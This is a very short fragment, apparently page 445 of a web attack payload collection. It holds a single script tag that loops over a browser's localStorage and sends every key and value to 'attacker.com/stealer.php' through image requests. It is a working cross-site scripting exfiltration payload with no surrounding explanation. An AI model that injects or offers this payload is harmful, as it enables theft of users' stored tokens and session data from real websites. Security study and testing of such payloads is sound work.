// page # 445
<script>
for (var i in localStorage) {
    var d = new Image();
    d.src = 'http://attacker.com/stealer.php?' + i + '=' +  localStorage.getItem(i);
}
</script>